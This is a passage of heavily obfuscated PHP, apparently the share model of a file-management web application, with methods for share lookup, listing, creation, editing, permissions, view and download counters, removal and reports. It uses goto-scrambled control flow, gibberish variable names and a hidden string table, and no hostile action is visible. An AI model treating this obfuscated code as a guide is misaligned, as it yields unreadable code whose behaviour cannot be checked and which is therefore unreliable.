getInfo($c—¬öÇˆ§Ô, $d²ˆŸŠ¤Õ = false) { $cÉøÈë– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($d²ˆŸŠ¤Õ) { return $this->_getShareInfo(array($cÉøÈë–[457] => $c—¬öÇˆ§Ô)); } $aŒôÊØ® = $this->cacheFunctionGet($cÉøÈë–[1767], $c—¬öÇˆ§Ô); return $aŒôÊØ®; } public function getInfoByHash($Dò­öË÷ÓÓ) { return $this->_getShareInfo(array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][459] => $Dò­öË÷ÓÓ)); } public function getInfoByPath($D–´‚¼êµË) { $EÃöåÚõèÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¿£ì¸§ôä = array($EÃöåÚõèÁ[1479] => USER_ID, $EÃöåÚõèÁ[387] => $D–´‚¼êµË); return $this->_getShareInfo($B¿£ì¸§ôä); } public function getInfoBySourcePath($Cô‚ëËõ§) { $F‘«•¯øÏª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÉá‰İš—Ê = array($F‘«•¯øÏª[1479] => USER_ID, $F‘«•¯øÏª[1022] => $Cô‚ëËõ§); return $this->_getShareInfo($DÉá‰İš—Ê); } private function _getShareInfo($dïİğ¿œ±) { goto c†Æò…ßêÖ; c†Æò…ßêÖ: $aëäó­èÆ• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BìĞÇäæò® = $this->where($dïİğ¿œ±)->find(); if (!$BìĞÇäæò®) { return !1; } goto DÃ½±Ê‰²Æ; cíÎ¤¾ø: if ($BìĞÇäæò®[$aëäó­èÆ•[387]] == $aëäó­èÆ•[486]) { $BìĞÇäæò®[$aëäó­èÆ•[84]] = IO::info($BìĞÇäæò®[$aëäó­èÆ•[1022]]); } else { $BìĞÇäæò®[$aëäó­èÆ•[84]] = Model($aëäó­èÆ•[1154])->pathInfo($BìĞÇäæò®[$aëäó­èÆ•[387]]); } $BìĞÇäæò®[$aëäó­èÆ•[1769]] = $F­ÖÊÚƒİè; return $BìĞÇäæò®; goto EéÆàˆİ¨; DÃ½±Ê‰²Æ: $dïİğ¿œ± = array($aëäó­èÆ•[457] => $BìĞÇäæò®[$aëäó­èÆ•[457]]); $CÎôÊ‚íç² = $aëäó­èÆ•[1768]; $F­ÖÊÚƒİè = Model($aëäó­èÆ•[553])->order($aëäó­èÆ•[385])->field($CÎôÊ‚íç²)->where($dïİğ¿œ±)->select(); goto cíÎ¤¾ø; EéÆàˆİ¨: } protected function getInfoAuth($aéäÚŞæÄ) { $D¬ª‰²ßÃ‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BîöâŒì¶ä = $this->getInfo($aéäÚŞæÄ); $BîöâŒì¶ä[$D¬ª‰²ßÃ‘[394]] = Model($D¬ª‰²ßÃ‘[472])->authMake($BîöâŒì¶ä[$D¬ª‰²ßÃ‘[1769]]); return $BîöâŒì¶ä; } protected function listData($Aé²æ‹Œ¥† = null, $D£Ù„¯‚— = 300) { $FâõÅº¿¿‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cõø„Å‹‘ˆ = array(array($FâõÅº¿¿‰[462] => array($FâõÅº¿¿‰[921], 0), $FâõÅº¿¿‰[464] => array($FâõÅº¿¿‰[921], 0), $FâõÅº¿¿‰[1770] => $FâõÅº¿¿‰[1727])); if ($Aé²æ‹Œ¥† == $FâõÅº¿¿‰[1771]) { $cõø„Å‹‘ˆ = array($FâõÅº¿¿‰[462] => 1); } else { if ($Aé²æ‹Œ¥† == $FâõÅº¿¿‰[1007]) { $cõø„Å‹‘ˆ = array($FâõÅº¿¿‰[464] => 1); } } $cõø„Å‹‘ˆ[$FâõÅº¿¿‰[1479]] = USER_ID; $cÊ¹…¸œ = $this->where($cõø„Å‹‘ˆ)->selectPage($D£Ù„¯‚—); return $cÊ¹…¸œ; } protected function listToMe($A†Ÿ÷Ãïë„ = 300) { goto BÍ›ÎÊï†Ö; A¿„°Î©„Ş: if (!$Aİçí©¾ŒÚ) { return $Cğ‚º÷ÜêŠ; } $B§»ãÁáóç = $B¯¡³‚ëš…[1773]; $e£ã¤¦Ã = array($B¯¡³‚ëš…[457] => array($B¯¡³‚ëš…[402], array_keys($Aİçí©¾ŒÚ))); goto A®÷’ùó¥®; A®÷’ùó¥®: $DĞâÒ«·º = $this->field($B§»ãÁáóç)->where($e£ã¤¦Ã)->select(); foreach ($DĞâÒ«·º as $e£ë©åŒ“Š => &$Aã³òËâÖ) { $Aã³òËâÖ[$B¯¡³‚ëš…[1769]] = $Aİçí©¾ŒÚ[$Aã³òËâÖ[$B¯¡³‚ëš…[457]]]; } unset($Aã³òËâÖ); goto AÖ¢ö‘³’õ; e…õ‰›Æ»ë: if ($fİÕº™´¹°) { $e£ã¤¦Ã = array(array($B¯¡³‚ëš…[538] => SourceModel::TYPE_USER, $B¯¡³‚ëš…[474] => USER_ID), array($B¯¡³‚ëš…[538] => SourceModel::TYPE_GROUP, $B¯¡³‚ëš…[474] => array($B¯¡³‚ëš…[7], $fİÕº™´¹°)), $B¯¡³‚ëš…[1770] => $B¯¡³‚ëš…[1727]); } $Cğ‚º÷ÜêŠ = Model($B¯¡³‚ëš…[553])->where($e£ã¤¦Ã)->selectPage($A†Ÿ÷Ãïë„); $Aİçí©¾ŒÚ = array_to_keyvalue_group($Cğ‚º÷ÜêŠ[$B¯¡³‚ëš…[363]], $B¯¡³‚ëš…[457]); goto A¿„°Î©„Ş; AÖ¢ö‘³’õ: $Fæ¹ï™á ” = array($B¯¡³‚ëš…[1774] => $DĞâÒ«·º, $B¯¡³‚ëš…[1775] => $Cğ‚º÷ÜêŠ[$B¯¡³‚ëš…[360]]); return $Fæ¹ï™á ”; goto bÙ†Œ¶¬ï¦; BÍ›ÎÊï†Ö: $B¯¡³‚ëš… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fİÕº™´¹° = Model($B¯¡³‚ëš…[1772])->userGroupParents(USER_ID); $e£ã¤¦Ã = array($B¯¡³‚ëš…[538] => SourceModel::TYPE_USER, $B¯¡³‚ëš…[474] => USER_ID); goto e…õ‰›Æ»ë; bÙ†Œ¶¬ï¦: } protected function shareAdd($f§Úõ½ĞÃ, $FË„åÚ‹©Š) { $fÆÕãˆÜŸ« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¯’ğ†°ôİ = $this->_addShareData($f§Úõ½ĞÃ, $FË„åÚ‹©Š); if (!empty($FË„åÚ‹©Š[$fÆÕãˆÜŸ«[1776]])) { $this->_shareAuthSet($D¯’ğ†°ôİ, $FË„åÚ‹©Š[$fÆÕãˆÜŸ«[1776]]); } $this->shareEventAdd($f§Úõ½ĞÃ, $FË„åÚ‹©Š, $fÆÕãˆÜŸ«[1010]); return $D¯’ğ†°ôİ; } private function shareEventAdd($bäàÚ”¯¼ç, $C”–‘©ù¼«, $BÚå’Œëíæ = "\x61\144\x64") { goto fÕ‰Å÷ŠÃ; câ³é‡Í‰Ç: if ($f£ë¼µ®•Ü[$eÃìµ¹šË[464]] == $eÃìµ¹šË[486] && $C”–‘©ù¼«[$eÃìµ¹šË[464]] == $eÃìµ¹šË[86]) { $B’Î”Îª‰© = $eÃìµ¹šË[1778]; } if ($f£ë¼µ®•Ü[$eÃìµ¹šË[464]] == $eÃìµ¹šË[86] && $C”–‘©ù¼«[$eÃìµ¹šË[464]] == $eÃìµ¹šË[486]) { $B’Î”Îª‰© = $eÃìµ¹šË[1781]; } Model($eÃìµ¹šË[522])->eventShare($bäàÚ”¯¼ç, $B’Î”Îª‰©); goto Aâà©Ÿå­; fÕ‰Å÷ŠÃ: $eÃìµ¹šË =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($BÚå’Œëíæ == $eÃìµ¹šË[1010]) { if ($C”–‘©ù¼«[$eÃìµ¹šË[462]] == $eÃìµ¹šË[86]) { Model($eÃìµ¹šË[522])->eventShare($bäàÚ”¯¼ç, $eÃìµ¹šË[1777]); } if ($C”–‘©ù¼«[$eÃìµ¹šË[464]] == $eÃìµ¹šË[86]) { Model($eÃìµ¹šË[522])->eventShare($bäàÚ”¯¼ç, $eÃìµ¹šË[1778]); } return; } $f£ë¼µ®•Ü = $this->getInfoByPath($bäàÚ”¯¼ç); goto e³ëìâËÎ; Aâà©Ÿå­: return; goto eà„‘†Îê™; e³ëìâËÎ: $B’Î”Îª‰© = $eÃìµ¹šË[1779]; if ($f£ë¼µ®•Ü[$eÃìµ¹šË[462]] == $eÃìµ¹šË[486] && $C”–‘©ù¼«[$eÃìµ¹šË[462]] == $eÃìµ¹šË[86]) { $B’Î”Îª‰© = $eÃìµ¹šË[1777]; } if ($f£ë¼µ®•Ü[$eÃìµ¹šË[462]] == $eÃìµ¹šË[86] && $C”–‘©ù¼«[$eÃìµ¹šË[462]] == $eÃìµ¹šË[486]) { $B’Î”Îª‰© = $eÃìµ¹šË[1780]; } goto câ³é‡Í‰Ç; eà„‘†Îê™: } private function _addShareData($e•Çø«„’, $AØ‡‰†¼Óâ = array()) { goto Dóç‚áî¦Ï; e ¦…ä©¨É: $E·†–ÎâèÁ = array($D¦©Æ¸ˆİ¤[1471] => USER_ID, $D¦©Æ¸ˆİ¤[401] => $e•Çø«„’, $D¦©Æ¸ˆİ¤[1384] => $D¦©Æ¸ˆİ¤[33], $D¦©Æ¸ˆİ¤[462] => 0, $D¦©Æ¸ˆİ¤[464] => 0, $D¦©Æ¸ˆİ¤[1022] => $D¦©Æ¸ˆİ¤[33], $D¦©Æ¸ˆİ¤[303] => $D¦©Æ¸ˆİ¤[33], $D¦©Æ¸ˆİ¤[801] => $D¦©Æ¸ˆİ¤[33], $D¦©Æ¸ˆİ¤[1783] => 0, $D¦©Æ¸ˆİ¤[1784] => 0, $D¦©Æ¸ˆİ¤[465] => 0, $D¦©Æ¸ˆİ¤[466] => $D¦©Æ¸ˆİ¤[33], $D¦©Æ¸ˆİ¤[459] => $D¦©Æ¸ˆİ¤[33]); $eö–ŞÈµùÙ = explode($D¦©Æ¸ˆİ¤[47], $D¦©Æ¸ˆİ¤[1785]); foreach ($eö–ŞÈµùÙ as $f¹²›ÒÃĞÏ) { if (!isset($AØ‡‰†¼Óâ[$f¹²›ÒÃĞÏ])) { continue; } $E·†–ÎâèÁ[$f¹²›ÒÃĞÏ] = $AØ‡‰†¼Óâ[$f¹²›ÒÃĞÏ]; } goto dÏİù¤•·; Dóç‚áî¦Ï: $D¦©Æ¸ˆİ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e´ãÊÌ³­ = array($D¦©Æ¸ˆİ¤[401] => $e•Çø«„’, $D¦©Æ¸ˆİ¤[1471] => USER_ID); if ($e•Çø«„’ == 0) { $e´ãÊÌ³­ = array($D¦©Æ¸ˆİ¤[1782] => $AØ‡‰†¼Óâ[$D¦©Æ¸ˆİ¤[1022]], $D¦©Æ¸ˆİ¤[1471] => USER_ID); } goto A÷‚ùÚ°Âİ; A÷‚ùÚ°Âİ: if ($eƒ¶òĞ¨ğ¢ = $this->where($e´ãÊÌ³­)->find()) { return $eƒ¶òĞ¨ğ¢[$D¦©Æ¸ˆİ¤[457]]; } if ($e•Çø«„’ == 0) { $E‚ºÙ‚ª×¯ = array($D¦©Æ¸ˆİ¤[28] => get_path_this($AØ‡‰†¼Óâ[$D¦©Æ¸ˆİ¤[75]])); } else { $E‚ºÙ‚ª×¯ = Model($D¦©Æ¸ˆİ¤[745])->sourceInfo($e•Çø«„’); if (!$E‚ºÙ‚ª×¯) { return !1; } } if (!$AØ‡‰†¼Óâ[$D¦©Æ¸ˆİ¤[1384]]) { $AØ‡‰†¼Óâ[$D¦©Æ¸ˆİ¤[1384]] = $E‚ºÙ‚ª×¯[$D¦©Æ¸ˆİ¤[28]]; } goto e ¦…ä©¨É; dÏİù¤•·: $D¬Ÿ‘˜î‚‹ = $this->add($E·†–ÎâèÁ); $b‚œ×¤Ì = array($D¦©Æ¸ˆİ¤[459] => short_id($D¬Ÿ‘˜î‚‹)); $this->where(array($D¦©Æ¸ˆİ¤[456] => $D¬Ÿ‘˜î‚‹))->save($b‚œ×¤Ì); goto BªêõÇ¢Â”; BªêõÇ¢Â”: return $D¬Ÿ‘˜î‚‹; goto C¦ùŠ¡‹œ; C¦ùŠ¡‹œ: } private function _shareAuthSet($B¯Ú’§À¶, $CŞãÃÂ¼ò) { goto cé±„ì ÇÎ; f–ß÷¯Ú¯˜: return $FÅ‘¸¥Ëø->addAll($få¦õÑÙŸ¥, array(), !0); goto e¿÷Ûä°¹Ó; fè‡±ĞŒ¤: $FÅ‘¸¥Ëø->where(array($E±¦§°ÁŸ[457] => $B¯Ú’§À¶))->delete(); $få¦õÑÙŸ¥ = array(); foreach ($CŞãÃÂ¼ò as $aŒÁçËÂ½†) { $Eù×´¶ø²ö = SourceModel::TYPE_USER; if ($aŒÁçËÂ½†[$E±¦§°ÁŸ[389]] == SourceModel::TYPE_GROUP) { $Eù×´¶ø²ö = SourceModel::TYPE_GROUP; } $A»ô³Î˜Ñ¼ = array($E±¦§°ÁŸ[457] => $B¯Ú’§À¶, $E±¦§°ÁŸ[389] => $Eù×´¶ø²ö, $E±¦§°ÁŸ[474] => intval($aŒÁçËÂ½†[$E±¦§°ÁŸ[474]]), $E±¦§°ÁŸ[1787] => 0, $E±¦§°ÁŸ[1788] => -1); if ($aŒÁçËÂ½†[$E±¦§°ÁŸ[1787]]) { $A»ô³Î˜Ñ¼[$E±¦§°ÁŸ[1787]] = $aŒÁçËÂ½†[$E±¦§°ÁŸ[1787]]; } else { if ($aŒÁçËÂ½†[$E±¦§°ÁŸ[1788]]) { $A»ô³Î˜Ñ¼[$E±¦§°ÁŸ[1788]] = $aŒÁçËÂ½†[$E±¦§°ÁŸ[1788]]; } } $få¦õÑÙŸ¥[] = $A»ô³Î˜Ñ¼; } goto f–ß÷¯Ú¯˜; cé±„ì ÇÎ: $E±¦§°ÁŸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!is_array($CŞãÃÂ¼ò)) { return !1; } $FÅ‘¸¥Ëø = Model($E±¦§°ÁŸ[1786]); goto fè‡±ĞŒ¤; e¿÷Ûä°¹Ó: } public function numViewAdd($AèÈ½íÊŞÑ) { $bµ‚øŒ¿ñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÍŠ¶–¯¥½ = array($bµ‚øŒ¿ñ[456] => $AèÈ½íÊŞÑ); $this->where($FÍŠ¶–¯¥½)->setAdd($bµ‚øŒ¿ñ[1783]); } public function numDownloadAdd($C ª÷©µç) { $aáÄÕÄ®áŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bãÓ´¨ÏÙ“ = array($aáÄÕÄ®áŠ[456] => $C ª÷©µç); $this->where($bãÓ´¨ÏÙ“)->setAdd($aáÄÕÄ®áŠ[1784]); } protected function shareEdit($B†–ç™¢æ¸, $c–’ÃëîîÉ) { goto f—â¢ ãÕÏ; f—â¢ ãÕÏ: $böÓËŠÙ²Ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dø†É—³¢… = $this->getInfo($B†–ç™¢æ¸); if (!$Dø†É—³¢…) { return !1; } goto c¬Åë”ÑÄë; c¬Åë”ÑÄë: $this->_checkLinkShare($c–’ÃëîîÉ, $Dø†É—³¢…); $FŠø’Âº = array(); $B‘Œ¬Õ‹´Ï = explode($böÓËŠÙ²Ô[47], $böÓËŠÙ²Ô[1789]); goto A„™í½»Ô ; DášŠÒ¸£ñ: if (isset($c–’ÃëîîÉ[$böÓËŠÙ²Ô[1776]])) { $this->_shareAuthSet($B†–ç™¢æ¸, $c–’ÃëîîÉ[$böÓËŠÙ²Ô[1776]]); } return !0; goto C°†ğ§¶Ä; A„™í½»Ô : foreach ($B‘Œ¬Õ‹´Ï as $dì¼õœŠîÖ) { if (!array_key_exists($dì¼õœŠîÖ, $c–’ÃëîîÉ)) { continue; } $FŠø’Âº[$dì¼õœŠîÖ] = $c–’ÃëîîÉ[$dì¼õœŠîÖ]; } $this->shareEventAdd($Dø†É—³¢…[$böÓËŠÙ²Ô[387]], $c–’ÃëîîÉ, $böÓËŠÙ²Ô[1605]); $this->where(array($böÓËŠÙ²Ô[456] => $B†–ç™¢æ¸))->save($FŠø’Âº); goto DášŠÒ¸£ñ; C°†ğ§¶Ä: } private function _checkLinkShare($dá×Âˆ™ìÛ, $c¤Ô±Ş‚¥) { goto c¤Ä»§‹ğÅ; D–Áé¹•Ÿä: if ($c¤Ô±Ş‚¥[$CÊöò÷ ò[84]][$CÊöò÷ ò[29]] != $CÊöò÷ ò[173]) { $B‡«·ŒøÒ = $this->_folderReport($eÍÀ‰Ä…); if (!$B‡«·ŒøÒ) { return; } show_json(LNG($CÊöò÷ ò[1790]) . $CÊöò÷ ò[1791] . $B‡«·ŒøÒ, !1); } $bš°ÚåÀùì = Model($CÊöò÷ ò[745])->fileInfoGet($c¤Ô±Ş‚¥[$CÊöò÷ ò[84]][$CÊöò÷ ò[387]]); if (!$bš°ÚåÀùì) { return; } goto e§¸ùÅŸ¯×; c¤Ä»§‹ğÅ: $CÊöò÷ ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($dá×Âˆ™ìÛ[$CÊöò÷ ò[462]] != $CÊöò÷ ò[86]) { return; } $eÍÀ‰Ä… = $c¤Ô±Ş‚¥[$CÊöò÷ ò[84]][$CÊöò÷ ò[387]]; goto D–Áé¹•Ÿä; e§¸ùÅŸ¯×: $D«‘³Œ†Ÿ = $this->shareFileMeta($bš°ÚåÀùì[$CÊöò÷ ò[436]]); if (isset($D«‘³Œ†Ÿ[$CÊöò÷ ò[368]]) && $D«‘³Œ†Ÿ[$CÊöò÷ ò[368]] == $CÊöò÷ ò[86]) { show_json(LNG($CÊöò÷ ò[1792]), !1); } goto CÜ¦ÒíÙù; CÜ¦ÒíÙù: } private function _folderReport($B¢ŒÜœ¹‡…) { goto F¬âˆàĞÂ‰; F¬âˆàĞÂ‰: $FÄ¶²™Å®ø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¦ÜÇÄÉó„ = array($FÄ¶²™Å®ø[436] => array($FÄ¶²™Å®ø[921], 0), $FÄ¶²™Å®ø[683] => 3); $Aæœê±ËÈÉ = Model($FÄ¶²™Å®ø[1793])->where($c¦ÜÇÄÉó„)->field($FÄ¶²™Å®ø[436])->select(); goto Cğ×¶Ñ İ¼; BÚ†»£‹œ·: $c¦ÜÇÄÉó„ = array($FÄ¶²™Å®ø[436] => array($FÄ¶²™Å®ø[7], $Aæœê±ËÈÉ), $FÄ¶²™Å®ø[477] => array($FÄ¶²™Å®ø[375], "\x25{$dÒ«ì’Šš‰}\x25"), $FÄ¶²™Å®ø[414] => 0); $D÷ˆÊ¤×šÁ = Model($FÄ¶²™Å®ø[745])->where($c¦ÜÇÄÉó„)->field($FÄ¶²™Å®ø[1794])->find(); if (!$D÷ˆÊ¤×šÁ) { return !1; } goto dÚ ¼…ÑñŠ; Cğ×¶Ñ İ¼: if (!$Aæœê±ËÈÉ) { return !1; } $Aæœê±ËÈÉ = array_to_keyvalue($Aæœê±ËÈÉ, $FÄ¶²™Å®ø[33], $FÄ¶²™Å®ø[436]); $dÒ«ì’Šš‰ = $FÄ¶²™Å®ø[47] . $B¢ŒÜœ¹‡… . $FÄ¶²™Å®ø[47]; goto BÚ†»£‹œ·; dÚ ¼…ÑñŠ: $Cªî¢¯¸õ¶ = substr($D÷ˆÊ¤×šÁ[$FÄ¶²™Å®ø[477]], strpos($D÷ˆÊ¤×šÁ[$FÄ¶²™Å®ø[477]], $dÒ«ì’Šš‰)); $c¦ÜÇÄÉó„ = array($FÄ¶²™Å®ø[387] => array($FÄ¶²™Å®ø[7], trim($Cªî¢¯¸õ¶, $FÄ¶²™Å®ø[47]))); $d¾Ï§Ñçº¬ = Model($FÄ¶²™Å®ø[745])->where($c¦ÜÇÄÉó„)->field($FÄ¶²™Å®ø[28])->select(); goto A„œ‰£¬½; A„œ‰£¬½: $f£•ç™‹ = array_to_keyvalue($d¾Ï§Ñçº¬, $FÄ¶²™Å®ø[33], $FÄ¶²™Å®ø[28]); $f£•ç™‹[] = $D÷ˆÊ¤×šÁ[$FÄ¶²™Å®ø[28]]; return implode($FÄ¶²™Å®ø[8], $f£•ç™‹); goto f»ÙÀõµø³; f»ÙÀõµø³: } protected function remove($dŠöÄñùñÏ) { goto cäìÏò„Æ; cäìÏò„Æ: $fäŠìŠš„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_array($dŠöÄñùñÏ)) { $dŠöÄñùñÏ = array($fäŠìŠš„[7], $dŠöÄñùñÏ); } $e–‡©àÜï• = array($fäŠìŠš„[457] => $dŠöÄñùñÏ); goto bÍÁší×ğ; AÅÔ‹ì³†: for ($c„»­ë°¼ = 0; $c„»­ë°¼ < count($aå¯ÊŠœ‹Æ); $c„»­ë°¼++) { $AÌàÔäÄÇÈ = $this->getInfo($aå¯ÊŠœ‹Æ[$c„»­ë°¼]); if ($AÌàÔäÄÇÈ[$fäŠìŠš„[464]] == $fäŠìŠš„[86]) { Model($fäŠìŠš„[522])->eventShare($AÌàÔäÄÇÈ[$fäŠìŠš„[387]], $fäŠìŠš„[1781]); } if ($AÌàÔäÄÇÈ[$fäŠìŠš„[462]] == $fäŠìŠš„[86]) { Model($fäŠìŠš„[522])->eventShare($AÌàÔäÄÇÈ[$fäŠìŠš„[387]], $fäŠìŠš„[1780]); } } return $bÕ‘ÉŞ¹±; goto f²¢—Ë¯³ê; bÍÁší×ğ: $bÕ‘ÉŞ¹± = $this->where($e–‡©àÜï•)->delete(); if ($bÕ‘ÉŞ¹±) { Model($fäŠìŠš„[553])->where(array($fäŠìŠš„[457] => $dŠöÄñùñÏ))->delete(); } $aå¯ÊŠœ‹Æ = is_array($dŠöÄñùñÏ) ? $dŠöÄñùñÏ[1] : array($dŠöÄñùñÏ); goto AÅÔ‹ì³†; f²¢—Ë¯³ê: } protected function removeBySource($D ©ï´ò¼ˆ) { goto f¯®á½ÜŠ¿; B­¾ˆ¶¦îø: $this->where($aÓ©„Å Äº)->delete(); Model($C„‰—ñ½Ÿ²[553])->where($aÓ©„Å Äº)->delete(); goto EÚğõ³²Ï; D‹ÎÛİ‹ëê: $B›÷ù…¹…Â = array_to_keyvalue($B›÷ù…¹…Â, $C„‰—ñ½Ÿ²[33], $C„‰—ñ½Ÿ²[457]); if (!$B›÷ù…¹…Â) { return; } $aÓ©„Å Äº = array($C„‰—ñ½Ÿ²[456] => array($C„‰—ñ½Ÿ²[402], $B›÷ù…¹…Â)); goto B­¾ˆ¶¦îø; f¯®á½ÜŠ¿: $C„‰—ñ½Ÿ² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÓ©„Å Äº = array($C„‰—ñ½Ÿ²[401] => array($C„‰—ñ½Ÿ²[402], $D ©ï´ò¼ˆ)); $B›÷ù…¹…Â = $this->field($C„‰—ñ½Ÿ²[457])->where($aÓ©„Å Äº)->select(); goto D‹ÎÛİ‹ëê; EÚğõ³²Ï: } public function listAll($eÕÄ¥õŞØ) { goto eğè˜ÌÕÙ‹; eğè˜ÌÕÙ‹: $DÄ¥¾è¤ªÑ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÅëì¼ôˆà = array(); if ($eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[1479]]) { $bÅëì¼ôˆà[$DÄ¥¾è¤ªÑ[1479]] = $eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[1479]]; } goto B¤¶ğ¤œæÛ; EáŠÆÏÂ: return $càòÒšÃî; goto F¶·õÆ¨„Î; B¤¶ğ¤œæÛ: if ($eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[696]]) { $då´¤ğ‚½± = $eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[465]] ? $eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[465]] : strtotime(date($DÄ¥¾è¤ªÑ[1795])); $bÅëì¼ôˆà[$DÄ¥¾è¤ªÑ[192]] = array($DÄ¥¾è¤ªÑ[329], array($eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[696]], $då´¤ğ‚½±)); } if ($eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[29]]) { $bÅëì¼ôˆà[$eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[29]]] = 1; } else { $bÅëì¼ôˆà[] = array($DÄ¥¾è¤ªÑ[462] => array($DÄ¥¾è¤ªÑ[921], 0), $DÄ¥¾è¤ªÑ[464] => array($DÄ¥¾è¤ªÑ[921], 0), $DÄ¥¾è¤ªÑ[1770] => $DÄ¥¾è¤ªÑ[1727]); } if ($eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[1723]]) { $bÅëì¼ôˆà[] = array($DÄ¥¾è¤ªÑ[459] => $eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[1723]], $DÄ¥¾è¤ªÑ[1384] => array($DÄ¥¾è¤ªÑ[375], "\45{$eÕÄ¥õŞØ[$DÄ¥¾è¤ªÑ[1723]]}\45"), $DÄ¥¾è¤ªÑ[1770] => $DÄ¥¾è¤ªÑ[1727]); } goto eÃÌ´ä¾óœ; eÃÌ´ä¾óœ: $càòÒšÃî = $this->_makeOrder()->where($bÅëì¼ôˆà)->selectPage(20); if (empty($càòÒšÃî[$DÄ¥¾è¤ªÑ[363]])) { return array(); } $this->_listDataApply($càòÒšÃî[$DÄ¥¾è¤ªÑ[363]]); goto EáŠÆÏÂ; F¶·õÆ¨„Î: } public function listDataApply($Fßôî‚¡) { $this->_listDataApply($Fßôî‚¡); return $Fßôî‚¡; } private function _listDataApply(&$fÕÚ¡×êÛ) { goto d•šŸ¡¿„·; d•šŸ¡¿„·: $cŒîå„ÃÖÚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CõªßçÓš£ = array_to_keyvalue($fÕÚ¡×êÛ, $cŒîå„ÃÖÚ[33], $cŒîå„ÃÖÚ[1479]); $E²¨ô‰”¡ = Model($cŒîå„ÃÖÚ[495])->userListInfo(array_unique($CõªßçÓš£)); goto BŒâ³¼é; BŒâ³¼é: $B¾¥ŸÇ¢íà = array_to_keyvalue($fÕÚ¡×êÛ, $cŒîå„ÃÖÚ[33], $cŒîå„ÃÖÚ[387]); $c§µæ£Ä¹• = Model($cŒîå„ÃÖÚ[745])->sourceListInfo($B¾¥ŸÇ¢íà, !0); foreach ($fÕÚ¡×êÛ as &$D»‡éî¢÷) { $a˜â„©Œ¶¤ = $D»‡éî¢÷[$cŒîå„ÃÖÚ[1479]]; $D»‡éî¢÷[$cŒîå„ÃÖÚ[1796]] = $E²¨ô‰”¡[$a˜â„©Œ¶¤] ? $E²¨ô‰”¡[$a˜â„©Œ¶¤] : !1; $eæìôì—Í¼ = $D»‡éî¢÷[$cŒîå„ÃÖÚ[387]]; $D»‡éî¢÷[$cŒîå„ÃÖÚ[84]] = $c§µæ£Ä¹•[$eæìôì—Í¼] ? $c§µæ£Ä¹•[$eæìôì—Í¼] : !1; } goto e¤Œ¶ÖØ; e¤Œ¶ÖØ: unset($D»‡éî¢÷); goto C…‡Ã´’Ö; C…‡Ã´’Ö: } private function _makeOrder($EÖŒ™ƒå×Ã = '') { goto Cº®¨Ÿ¬Ÿ; Cº®¨Ÿ¬Ÿ: $dØ„æØ­Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dñÌ±¼ÎŒÈ = array($dØ„æØ­Ì[192], $dØ„æØ­Ì[465], $dØ„æØ­Ì[1783], $dØ„æØ­Ì[1784]); $D­´ÉéïãŠ = array($dØ„æØ­Ì[419] => $dØ„æØ­Ì[420], $dØ„æØ­Ì[421] => $dØ„æØ­Ì[422]); goto BŸ’¤ğ’µê; BŸ’¤ğ’µê: $BÉîÁøñÂª = Input::get($dØ„æØ­Ì[424], $dØ„æØ­Ì[7], $dØ„æØ­Ì[407], $dñÌ±¼ÎŒÈ); $FŞöØæî–Ğ = Input::get($dØ„æØ­Ì[425], $dØ„æØ­Ì[7], $dØ„æØ­Ì[1797], array($dØ„æØ­Ì[1722], $dØ„æØ­Ì[421])); $FŞöØæî–Ğ = $D­´ÉéïãŠ[$FŞöØæî–Ğ]; goto Bñ‚÷ó‚Ò; Bñ‚÷ó‚Ò: $EÖŒ™ƒå×Ã = $EÖŒ™ƒå×Ã . "{$BÉîÁøñÂª}\40{$FŞöØæî–Ğ}"; return $this->order($EÖŒ™ƒå×Ã); goto FŒöÙãôáß; FŒöÙãôáß: } public function reportAdd($AõŒ¢ğÌøë) { $Bá£Ğö½‡à =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bîÃƒ°¹ç = array($Bá£Ğö½‡à[457] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[457]], $Bá£Ğö½‡à[1479] => USER_ID); if (Model($Bá£Ğö½‡à[1793])->where($bîÃƒ°¹ç)->find()) { return !1; } $bƒù©ë£êù = array($Bá£Ğö½‡à[457] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[457]], $Bá£Ğö½‡à[1384] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[1384]], $Bá£Ğö½‡à[387] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[387]], $Bá£Ğö½‡à[436] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[436]], $Bá£Ğö½‡à[1479] => USER_ID, $Bá£Ğö½‡à[29] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[29]], $Bá£Ğö½‡à[422] => $AõŒ¢ğÌøë[$Bá£Ğö½‡à[422]]); return Model($Bá£Ğö½‡à[1793])->add($bƒù©ë£êù); } public function 